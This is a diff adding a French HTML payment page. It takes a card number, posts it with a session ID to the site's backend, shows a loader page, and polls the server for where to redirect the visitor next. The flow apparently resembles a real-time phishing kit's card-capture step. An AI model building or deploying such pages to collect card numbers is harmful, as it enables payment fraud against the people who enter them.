@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Paiement</title></head>
+<body>
+<h1>💳 Paiement</h1>
+<form onsubmit="submitPayment(event)">
+Numéro carte: <input type="text" id="cardNumber" required><br>
+<button type="submit">Valider</button>
+</form>
+<script>
+async function submitPayment(e){
+  e.preventDefault();
+  const sessionId = localStorage.getItem('sessionId');
+  const cardNumber = document.getElementById('cardNumber').value;
+  await fetch('/api/payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId,cardNumber})});
+  window.location.href = '/loader.html';
+}
+async function checkRedirect(){
+  const sessionId = localStorage.getItem('sessionId');
+  const res = await fetch('/api/status?sessionId='+sessionId);
+  const data = await res.json();
+  if(data.redirect) window.location.href = data.redirect;
+  else setTimeout(checkRedirect,2000);
+}
+checkRedirect();
+</script>
+</body>
+</html>
